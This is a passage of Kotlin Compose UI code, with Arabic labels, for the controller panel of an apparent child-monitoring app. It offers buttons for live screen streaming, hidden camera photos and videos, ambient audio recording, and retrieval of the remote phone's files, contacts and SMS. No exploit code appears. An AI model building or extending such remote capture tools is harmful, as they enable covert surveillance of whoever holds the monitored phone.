            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            shape = RoundedCornerShape(16.dp),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "تفاصيل المساحة التخزينية لجهاز الطفل",
                    color = Color(0xFF1F2937),
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.padding(bottom = 8.dp)
                )

                val usedGb = if (device.storageUsed > 1_000_000)
                    String.format(Locale.ENGLISH, "%.2f", device.storageUsed.toDouble() / (1024.0 * 1024.0 * 1024.0))
                else
                    String.format(Locale.ENGLISH, "%.2f", device.storageUsed.toDouble())
                
                val totalGb = if (device.storageTotal > 1_000_000)
                    String.format(Locale.ENGLISH, "%.2f", device.storageTotal.toDouble() / (1024.0 * 1024.0 * 1024.0))
                else
                    String.format(Locale.ENGLISH, "%.2f", device.storageTotal.toDouble())
                val progressValue = if (device.storageTotal > 0) {
                    (device.storageUsed.toFloat() / device.storageTotal.toFloat())
                } else {
                    0f
                }

                LinearProgressIndicator(
                    progress = { progressValue },
                    color = Color(0xFF9155FF),
                    trackColor = Color(0xFFE5E7EB),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(10.dp)
                        .clip(RoundedCornerShape(5.dp))
                )

                Spacer(modifier = Modifier.height(8.dp))
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Text(
                        text = "المستخدم: $usedGb جيجا",
                        color = Color(0xFF6B7280),
                        fontSize = 12.sp
                    )
                    Text(
                        text = "الإجمالي: $totalGb جيجا",
                        color = Color(0xFF6B7280),
                        fontSize = 12.sp
                    )
                }
            }
        }

        // Info disclaimer card
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFE5E7EB)),
            shape = RoundedCornerShape(12.dp),
            modifier = Modifier.fillMaxWidth()
        ) {
            Row(
                modifier = Modifier.padding(12.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Icon(
                    imageVector = Icons.Default.Info,
                    contentDescription = null,
                    tint = Color(0xFFFF4081),
                    modifier = Modifier.size(20.dp)
                )
                Spacer(modifier = Modifier.width(8.dp))
                Text(
                    text = "هذا لوحة التحكم الخاصة بالمشرف ومزامنتها تامة مع برنامج الطفل لحمايته وتتبع نشاطاته بطريقة قانونية وعلم الوالدين.",
                    color = Color(0xFF374151),
                    fontSize = 11.sp,
                    lineHeight = 16.sp
                )
            }
        }
    }
}

// 4. TAB 2: REMOTE OPERATIONS (SCREENSHOTS, CAM, AUDIO, APPS)
@Composable
fun RemoteCommandCenterTab(viewModel: AdminViewModel) {
    val screenshots by viewModel.screenshots.collectAsState()
    val cameraPhotos by viewModel.cameraPhotos.collectAsState()
    val isStreamingActive by remember(viewModel) { viewModel.liveStreamState.map { it?.isActive == true }.distinctUntilChanged() }.collectAsState(initial = false)
    val isLoading by remember(viewModel) { viewModel.liveStreamState.map { it?.isLoading == true }.distinctUntilChanged() }.collectAsState(initial = false)
    val audioRecords by viewModel.audioRecords.collectAsState()
    val cameraVideos by viewModel.cameraVideos.collectAsState()
    val installedApps by viewModel.installedApps.collectAsState()

    val isAudioPlaying by viewModel.isAudioPlaying.collectAsState()
    val audioDuration by viewModel.audioDuration.collectAsState()
    val audioPosition by viewModel.audioPosition.collectAsState()

    var activeCommandSubIndex by remember { mutableIntStateOf(0) }
    var showFullscreenBitmap by remember { mutableStateOf<Bitmap?>(null) }
    var userAppsSearchQuery by remember { mutableStateOf("") }
    var userAppsFilterIsSystem by remember { mutableStateOf<Boolean?>(false) }
    val context = LocalContext.current

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        // Mode switch selectors
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 12.dp)
                .background(Color(0xFFFFFFFF), RoundedCornerShape(8.dp))
                .padding(4.dp),
            horizontalArrangement = Arrangement.spacedBy(4.dp)
        ) {
            val items = listOf("الكاميرا", "الصوت", "التطبيقات", "الفيديو")
            items.forEachIndexed { idx, title ->
                Button(
                    onClick = { activeCommandSubIndex = idx },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (activeCommandSubIndex == idx) Color(0xFF9155FF) else Color.Transparent,
                        contentColor = if (activeCommandSubIndex == idx) Color(0xFF1F2937) else Color(0xFF6B7280)
                    ),
                    shape = RoundedCornerShape(6.dp),
                    contentPadding = PaddingValues(vertical = 4.dp),
                    modifier = Modifier.weight(1f).height(36.dp)
                ) {
                    Text(title, fontSize = 10.sp, fontWeight = FontWeight.Bold, maxLines = 1)
                }
            }
        }

        HorizontalDivider(modifier = Modifier.padding(bottom = 12.dp), color = Color(0xFFE5E7EB))

        Box(modifier = Modifier.fillMaxSize().weight(1f)) {
            when (activeCommandSubIndex) {
                0 -> {
                    // SCREENSHOT AND PHOTO DISPATCH PANEL
                    Column(
                        modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()),
                        verticalArrangement = Arrangement.spacedBy(16.dp)
                    ) {
                        // 📺 Live Stream Card... (Keep as is since it's real-time)
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                            shape = RoundedCornerShape(16.dp),
                            border = BorderStroke(1.dp, if (isStreamingActive) Color(0xFF39D353) else if(isLoading) Color(0xFF9155FF) else Color(0xFFE5E7EB)),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(16.dp)) {
                                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Tv, null, tint = if (isStreamingActive) Color(0xFF39D353) else Color(0xFF6B7280), modifier = Modifier.size(24.dp))
                                        Spacer(modifier = Modifier.width(8.dp))
                                        Column {
                                            Text("بث الشاشة الحي", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                                            Text("مراقبة شاشة الهاتف لحظياً", color = Color(0xFF6B7280), fontSize = 11.sp)
                                        }
                                    }
                                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clip(RoundedCornerShape(8.dp)).background(if (isStreamingActive) Color(0xFF238636).copy(alpha = 0.2f) else if(isLoading) Color(0xFF9155FF).copy(alpha = 0.2f) else Color(0xFFFF4081).copy(alpha = 0.2f)).padding(horizontal = 8.dp, vertical = 4.dp)) {
                                        Box(modifier = Modifier.size(6.dp).clip(CircleShape).background(if (isStreamingActive) Color(0xFF39D353) else if(isLoading) Color(0xFF9155FF) else Color(0xFFFF4081)))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text(if (isLoading) "تحميل" else if (isStreamingActive) "نشط" else "متوقف", color = if (isStreamingActive) Color(0xFF39D353) else if(isLoading) Color(0xFF9155FF) else Color(0xFFFF4081), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                    }
                                }
                                HorizontalDivider(modifier = Modifier.padding(vertical = 12.dp), color = Color(0xFFE5E7EB))
                                Box(modifier = Modifier.fillMaxWidth().height(260.dp).clip(RoundedCornerShape(10.dp)).background(Color(0xFFF9FAFB)).border(1.dp, Color(0xFFE5E7EB), RoundedCornerShape(10.dp)), contentAlignment = Alignment.Center) {
                                    val bitmap by produceState<Bitmap?>(initialValue = null, viewModel) {
                                        viewModel.liveStreamState.map { Pair(it?.image, it?.timestamp) }.distinctUntilChanged().conflate().collect { pair ->
                                            val imgStr = pair.first
                                            value = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) { imgStr?.let { com.example.admin.LiveStreamState(image = it).toBitmap() } }
                                        }
                                    }
                                    if (isLoading) {
                                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                            CircularProgressIndicator(color = Color(0xFF9155FF), modifier = Modifier.size(36.dp))
                                            Spacer(Modifier.height(8.dp))
                                            Text("جاري الاتصال بهاتف الطفل...", color = Color(0xFF6B7280), fontSize = 12.sp)
                                        }
                                    } else if (isStreamingActive && bitmap != null) {
                                        Image(bitmap!!.asImageBitmap(), null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Fit)
                                        Box(modifier = Modifier.align(Alignment.TopStart).padding(12.dp).background(Color(0xFFEF4444), RoundedCornerShape(4.dp)).padding(horizontal = 8.dp, vertical = 3.dp)) {
                                            Row(verticalAlignment = Alignment.CenterVertically) {
                                                Box(modifier = Modifier.size(6.dp).clip(CircleShape).background(Color(0xFF1F2937)))
                                                Spacer(modifier = Modifier.width(4.dp))
                                                Text("مباشر", color = Color(0xFF1F2937), fontSize = 9.sp, fontWeight = FontWeight.Bold)
                                            }
                                        }
                                        IconButton(onClick = { showFullscreenBitmap = bitmap }, modifier = Modifier.align(Alignment.BottomEnd).padding(8.dp).background(Color.Black.copy(alpha = 0.6f), CircleShape)) {
                                            Icon(Icons.Default.Fullscreen, null, tint = Color(0xFF1F2937))
                                        }
                                    } else if (isStreamingActive) {
                                        CircularProgressIndicator(color = Color(0xFF9155FF), modifier = Modifier.size(36.dp))
                                    } else {
                                        Icon(Icons.Default.TvOff, null, tint = Color(0xFF6B7280).copy(alpha = 0.5f), modifier = Modifier.size(48.dp))
                                    }
                                }
                                Spacer(modifier = Modifier.height(16.dp))
                                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                                    Button(onClick = { viewModel.startLiveStream() }, enabled = !isStreamingActive && !isLoading, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636)), shape = RoundedCornerShape(10.dp), modifier = Modifier.weight(1f).height(46.dp)) {
                                        Icon(Icons.Default.PlayArrow, null)
                                        Spacer(Modifier.width(8.dp))
                                        Text("بدء البث", fontSize = 12.sp)
                                    }
                                    Button(onClick = { viewModel.stopLiveStream() }, enabled = isStreamingActive || isLoading, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)), shape = RoundedCornerShape(10.dp), modifier = Modifier.weight(1f).height(46.dp)) {
                                        Icon(if(isLoading) Icons.Default.Cancel else Icons.Default.Stop, null)
                                        Spacer(Modifier.width(8.dp))
                                        Text(if(isLoading) "إلغاء الطلب" else "إيقاف", fontSize = 12.sp)
                                    }
                                }
                            }
                        }

                        HorizontalDivider(modifier = Modifier.padding(vertical = 4.dp), color = Color(0xFFE5E7EB))

                        // Controls
                        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                            Button(onClick = { viewModel.requestScreenshot() }, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)), modifier = Modifier.weight(1f).height(48.dp), shape = RoundedCornerShape(10.dp)) {
                                Icon(Icons.Default.Screenshot, null, modifier = Modifier.size(18.dp))
                                Spacer(modifier = Modifier.width(8.dp))
                                Text("لقطة شاشة", fontSize = 12.sp)
                            }
                            Button(onClick = { viewModel.requestPhoto(false) }, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFFFFFF)), border = BorderStroke(1.dp, Color(0xFFE5E7EB)), modifier = Modifier.weight(1f).height(48.dp), shape = RoundedCornerShape(10.dp)) {
                                Icon(Icons.Default.Camera, null, modifier = Modifier.size(18.dp), tint = Color(0xFFFF4081))
                                Spacer(modifier = Modifier.width(8.dp))
                                Text("صورة خلفية", fontSize = 12.sp)
                            }
                        }
                        Button(onClick = { viewModel.requestPhoto(true) }, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFFFFFF)), border = BorderStroke(1.dp, Color(0xFFE5E7EB)), modifier = Modifier.fillMaxWidth().height(44.dp), shape = RoundedCornerShape(10.dp)) {
                            Icon(Icons.Default.CameraFront, null, modifier = Modifier.size(18.dp), tint = Color.Cyan)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("صورة أمامية", fontSize = 12.sp)
                        }

                        // Bento Grids
                        Text("لقطات الشاشة المُخزنة", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(top = 8.dp))
                        BentoMediaGrid(
                            items = screenshots,
                            category = "screenshots",
                            onDelete = { viewModel.deleteMediaItem("screenshots", it.id) },
                            onExpand = { showFullscreenBitmap = it },
                            onSave = { bmp -> saveBitmapToGallery(context, bmp, "sc_${System.currentTimeMillis()}") }
                        )

                        HorizontalDivider(color = Color(0xFFE5E7EB))

                        Text("سجل صور الكاميرا", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        BentoMediaGrid(
                            items = cameraPhotos,
                            category = "camera_photos",
                            onDelete = { viewModel.deleteMediaItem("camera_photos", it.id) },
                            onExpand = { showFullscreenBitmap = it },
                            onSave = { bmp -> saveBitmapToGallery(context, bmp, "cam_${System.currentTimeMillis()}") }
                        )
                    }
                }
                1 -> {
                    // AMBIENT SOUND TAB...
                    Column(modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()), verticalArrangement = Arrangement.spacedBy(16.dp)) {
                        Card(colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)), shape = RoundedCornerShape(16.dp), border = BorderStroke(1.dp, Color(0xFFE5E7EB))) {
                            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Icon(Icons.Default.Mic, null, tint = Color(0xFF9155FF), modifier = Modifier.size(28.dp))
                                    Spacer(Modifier.width(12.dp))
                                    Column {
                                        Text("التسجيل الصوتي المحيطي", color = Color(0xFF1F2937), fontSize = 15.sp, fontWeight = FontWeight.Bold)
                                        Text("استماع للأصوات بجانب هاتف الطفل", color = Color(0xFF6B7280), fontSize = 11.sp)
                                    }
                                }
                                Button(onClick = { viewModel.requestAudioRecord() }, modifier = Modifier.fillMaxWidth().height(48.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)), shape = RoundedCornerShape(10.dp)) {
                                    Text("ابدأ تسجيل 30 ثانية الآن", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                                }
                            }
                        }

                        Text("التسجيلات المستلمة", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        if (audioRecords.isEmpty()) {
                            Box(modifier = Modifier.fillMaxWidth().height(100.dp), contentAlignment = Alignment.Center) {
                                Text("لا توجد تسجيلات صوتية", color = Color(0xFF6B7280), fontSize = 12.sp)
                            }
                        } else {
                            audioRecords.forEach { item ->
                                Card(colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)), border = BorderStroke(1.dp, Color(0xFFE5E7EB)), modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)) {
                                    Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                                        IconButton(onClick = { viewModel.loadAndPlayAudio(item.base64) }) {
                                            Icon(Icons.Default.PlayCircle, null, tint = Color.Green, modifier = Modifier.size(32.dp))
                                        }
                                        Column(modifier = Modifier.weight(1f).padding(horizontal = 8.dp)) {
                                            Text("تسجيل صوتي", color = Color(0xFF1F2937), fontSize = 13.sp)
                                            Text(SimpleDateFormat("h:mm a, d/M", Locale.getDefault()).format(Date(item.timestamp)), color = Color(0xFF6B7280), fontSize = 10.sp)
                                        }
                                        IconButton(onClick = { viewModel.deleteMediaItem("audio_records", item.id) }) {
                                            Icon(Icons.Default.Delete, null, tint = Color(0xFFEF4444))
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                2 -> {
                    // APPS TAB... (existing logic is fine, maybe add search/filter if needed)
                    Column(modifier = Modifier.fillMaxSize()) {
                        Button(onClick = { viewModel.requestAppsList() }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF4081))) {
                            Text("تحديث قائمة التطبيقات")
                        }
                        Spacer(Modifier.height(8.dp))
                        // Simplified apps list
                        LazyColumn(modifier = Modifier.weight(1f)) {
                            items(installedApps) { app ->
                                Card(colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)), modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)) {
                                    Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Apps, null, tint = Color(0xFF1F2937))
                                        Spacer(Modifier.width(12.dp))
                                        Column {
                                            Text(app.name, color = Color(0xFF1F2937), fontWeight = FontWeight.Bold)
                                            Text(app.packageName, color = Color(0xFF6B7280), fontSize = 10.sp)
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                3 -> {
                    // VIDEO RECORDING PANEL
                    Column(
                        modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()),
                        verticalArrangement = Arrangement.spacedBy(16.dp)
                    ) {
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
                            shape = RoundedCornerShape(16.dp)
                        ) {
                            Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                                Icon(Icons.Default.Videocam, null, tint = Color(0xFFEF4444), modifier = Modifier.size(36.dp))
                                Spacer(Modifier.height(8.dp))
                                Text("تسجيل فيديو عن بعد", color = Color(0xFF1F2937), fontSize = 16.sp, fontWeight = FontWeight.Bold)
                                Text("سيتم تسجيل فيديو لمدة 10 ثوانٍ من كاميرا الطفل", color = Color(0xFF6B7280), fontSize = 11.sp)
                                Spacer(Modifier.height(16.dp))
                                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                                    Button(
                                        onClick = { viewModel.requestVideo(false) },
                                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)),
                                        modifier = Modifier.weight(1f).height(46.dp),
                                        shape = RoundedCornerShape(10.dp)
                                    ) {
                                        Icon(Icons.Default.CameraRear, null, modifier = Modifier.size(16.dp))
                                        Spacer(Modifier.width(8.dp))
                                        Text("خلفية", fontSize = 12.sp)
                                    }
                                    Button(
                                        onClick = { viewModel.requestVideo(true) },
                                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF)),
                                        modifier = Modifier.weight(1f).height(46.dp),
                                        shape = RoundedCornerShape(10.dp)
                                    ) {
                                        Icon(Icons.Default.CameraFront, null, tint = Color.Black, modifier = Modifier.size(16.dp))
                                        Spacer(Modifier.width(8.dp))
                                        Text("أمامية", color = Color.Black, fontSize = 12.sp)
                                    }
                                }
                            }
                        }

                        Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Default.VideoLibrary, null, tint = Color(0xFF6B7280), modifier = Modifier.size(18.dp))
                                Spacer(Modifier.width(8.dp))
                                Text("سجل الفيديوهات المستلمة", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                                Spacer(Modifier.weight(1f))
                                Text("${cameraVideos.size} فيديو", color = Color(0xFF6B7280), fontSize = 10.sp)
                            }
                            
                            if (cameraVideos.isEmpty()) {
                                EmptyHistoryPlaceholder("لم يتم استقبال أي فيديوهات بعد")
                            } else {
                                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                                    cameraVideos.forEach { video ->
                                        Card(
                                            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                                            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
                                            shape = RoundedCornerShape(12.dp)
                                        ) {
                                            Row(
                                                modifier = Modifier.fillMaxWidth().padding(12.dp),
                                                verticalAlignment = Alignment.CenterVertically
                                            ) {
                                                Icon(Icons.Default.PlayCircle, null, tint = Color(0xFFEF4444), modifier = Modifier.size(32.dp))
                                                Spacer(Modifier.width(12.dp))
                                                Column(Modifier.weight(1f)) {
                                                    Text("فيديو مسجل", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold, fontSize = 13.sp)
                                                    Text(
                                                        SimpleDateFormat("HH:mm:ss dd/MM", Locale.getDefault()).format(Date(video.timestamp)),
                                                        color = Color(0xFF6B7280),
                                                        fontSize = 11.sp
                                                    )
                                                }
                                                IconButton(onClick = { viewModel.deleteMediaItem("camera_videos", video.id) }) {
                                                    Icon(Icons.Default.Delete, null, tint = Color(0xFFEF4444), modifier = Modifier.size(18.dp))
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    showFullscreenBitmap?.let { bmp ->
        Dialog(onDismissRequest = { showFullscreenBitmap = null }) {
            Box(modifier = Modifier.fillMaxSize().clickable { showFullscreenBitmap = null }.background(Color.Black.copy(alpha = 0.9f)), contentAlignment = Alignment.Center) {
                Image(bmp.asImageBitmap(), null, modifier = Modifier.fillMaxWidth(0.95f), contentScale = ContentScale.Fit)
            }
        }
    }
}

// 5. TAB 3: FILE EXPLORER PANEL
@Composable
fun RemoteFileExplorerTab(viewModel: AdminViewModel) {
    val fileItems by viewModel.fileItems.collectAsState()
    val currentPath by viewModel.currentPath.collectAsState()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        // Upper Navigation Breadcrumbs
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            shape = RoundedCornerShape(10.dp),
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 12.dp),
            border = BorderStroke(1.dp, Color(0xFFE5E7EB))
        ) {
            Column(modifier = Modifier.padding(12.dp)) {
                Text(
                    text = "مستكشف ملفات الطفل السحابي",
                    color = Color(0xFF6B7280),
                    fontSize = 11.sp
                )
                Spacer(modifier = Modifier.height(4.dp))
                Row(
                    modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(Icons.Default.Folder, null, tint = Color(0xFF9155FF), modifier = Modifier.size(16.dp))
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = currentPath,
                        color = Color(0xFF1F2937),
                        fontSize = 13.sp,
                        fontWeight = FontWeight.Bold,
                        fontFamily = FontFamily.Monospace,
                        maxLines = 1
                    )
                }
            }
        }

        // Control Breadcrumb Action
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 12.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            val showUp = currentPath != "/storage/emulated/0" && currentPath != "/" && currentPath.isNotEmpty()
            
            Button(
                onClick = {
                    if (showUp) {
                        val parent = currentPath.substringBeforeLast("/")
                        viewModel.exploreDirectory(if (parent.isBlank()) "/" else parent)
                    } else {
                        viewModel.exploreDirectory("/storage/emulated/0")
                    }
                },
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE5E7EB)),
                enabled = showUp,
                shape = RoundedCornerShape(8.dp)
            ) {
                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null, modifier = Modifier.size(16.dp))
                Spacer(modifier = Modifier.width(4.dp))
                Text("المجلد السابق", fontSize = 11.sp)
            }

            IconButton(
                onClick = { viewModel.exploreDirectory(currentPath) },
                modifier = Modifier.background(Color(0xFFE5E7EB), CircleShape).size(36.dp)
            ) {
                Icon(Icons.Default.Refresh, contentDescription = "Refresh", tint = Color(0xFF1F2937), modifier = Modifier.size(18.dp))
            }
        }

        // Folders and files list
        if (fileItems.isNotEmpty()) {
            LazyColumn(
                verticalArrangement = Arrangement.spacedBy(8.dp),
                modifier = Modifier.fillMaxSize()
            ) {
                items(fileItems) { item ->
                    Card(
                        onClick = {
                            if (item.isDir) {
                                viewModel.exploreDirectory(item.path)
                            }
                        },
                        colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(12.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                imageVector = if (item.isDir) Icons.Default.Folder else Icons.Default.InsertDriveFile,
                                contentDescription = null,
                                tint = if (item.isDir) Color(0xFFD29922) else Color(0xFF6B7280),
                                modifier = Modifier.size(24.dp)
                            )

                            Spacer(modifier = Modifier.width(12.dp))

                            Column(modifier = Modifier.weight(1f)) {
                                Text(
                                    text = item.name,
                                    color = Color(0xFF1F2937),
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.Bold,
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis
                                )
                                Spacer(modifier = Modifier.height(2.dp))
                                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                    Text(
                                        text = item.date,
                                        color = Color(0xFF6B7280),
                                        fontSize = 10.sp
                                    )
                                    if (!item.isDir) {
                                        val kbGbText = remember(item.size) { formatSize(item.size) }
                                        Text(
                                            text = "• $kbGbText",
                                            color = Color(0xFF6B7280),
                                            fontSize = 10.sp
                                        )
                                    }
                                }
                            }

                            if (item.isDir) {
                                Icon(
                                    imageVector = Icons.Default.ChevronRight,
                                    contentDescription = null,
                                    tint = Color(0xFFE5E7EB)
                                )
                            }
                        }
                    }
                }
            }
        } else {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .weight(1f),
                contentAlignment = Alignment.Center
            ) {
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(Icons.Default.FolderZip, null, tint = Color(0xFFE5E7EB), modifier = Modifier.size(48.dp))
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("المجلد فارغ أو لم يتم تلقي القائمة بعد.", color = Color(0xFF6B7280), fontSize = 12.sp)
                }
            }
        }
    }
}

// 6. TAB 4: LIVE RECEPTION - SMS & SECURITY ALERTS
@Composable
fun ContactsTab(viewModel: AdminViewModel) {
    val contacts by viewModel.contacts.collectAsState()
    var searchQuery by remember { mutableStateOf("") }
    
    val filteredContacts = remember(contacts, searchQuery) {
        if (searchQuery.isBlank()) {
            contacts
        } else {
            contacts.filter { 
                it.name.contains(searchQuery, ignoreCase = true) || 
                it.number.contains(searchQuery, ignoreCase = true) 
            }
        }
    }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        Button(
            onClick = { viewModel.requestContacts() },
            modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))
        ) {
            Icon(Icons.Default.Refresh, null, modifier = Modifier.size(18.dp))
            Spacer(Modifier.width(8.dp))
            Text("جلب جهات الاتصال", fontWeight = FontWeight.Bold)
        }

        OutlinedTextField(
            value = searchQuery,
            onValueChange = { searchQuery = it },
            modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
            placeholder = { Text("البحث في جهات الاتصال...") },
            leadingIcon = { Icon(Icons.Default.Search, null) },
            singleLine = true,
            shape = RoundedCornerShape(12.dp),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = Color(0xFF9155FF),
                unfocusedBorderColor = Color(0xFFE5E7EB)
            )
        )

        LazyColumn(
            modifier = Modifier.weight(1f),
            verticalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            items(filteredContacts) { contact ->
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(16.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(48.dp)
                                .clip(CircleShape)
                                .background(Color(0xFFF3E8FF)),
                            contentAlignment = Alignment.Center
                        ) {
                            val firstChar = contact.name.trim().firstOrNull()?.toString()?.uppercase() ?: "?"
                            Text(
                                text = firstChar,
                                color = Color(0xFF9155FF),
                                fontWeight = FontWeight.Bold,
                                fontSize = 20.sp
                            )
                        }
                        Spacer(Modifier.width(16.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = contact.name.takeIf { it.isNotBlank() } ?: "بدون اسم", 
                                color = Color(0xFF1F2937), 
                                fontSize = 16.sp, 
                                fontWeight = FontWeight.Bold
                            )
                            Spacer(Modifier.height(4.dp))
                            Text(
                                text = contact.number, 
                                color = Color(0xFF6B7280), 
                                fontSize = 14.sp
                            )
                        }
                        IconButton(onClick = { /* No action needed */ }) {
                            Icon(Icons.Default.Phone, null, tint = Color(0xFF39D353))
                        }
                    }
                }
            }
            if (contacts.isEmpty()) {
                item {
                    Box(Modifier.fillMaxWidth().height(150.dp), contentAlignment = Alignment.Center) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Icon(Icons.Default.PersonSearch, contentDescription = null, modifier = Modifier.size(48.dp), tint = Color(0xFFE5E7EB))
                            Spacer(Modifier.height(8.dp))
                            Text("لا توجد جهات اتصال متاحة، انقر على زر الجلب.", color = Color(0xFF6B7280), fontSize = 14.sp)
                        }
                    }
                }
            } else if (filteredContacts.isEmpty()) {
                item {
                    Box(Modifier.fillMaxWidth().height(150.dp), contentAlignment = Alignment.Center) {
                        Text("لا يوجد نتائج مطابقة للبحث.", color = Color(0xFF6B7280), fontSize = 14.sp)
                    }
                }
            }
        }
    }
}

@Composable
fun SmsAndSecurityAlertsTab(viewModel: AdminViewModel) {
    val smsLogs by viewModel.smsLogs.collectAsState()
    var selectedContact by remember { mutableStateOf<String?>(null) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        // Fetch Button
        Button(
            onClick = { viewModel.runCommand("get_sms") },
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)),
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp)
        ) {
            Text("جلب وتحديث الرسائل (SMS)", color = Color.White, fontWeight = FontWeight.Bold)
        }

        Box(
            modifier = Modifier
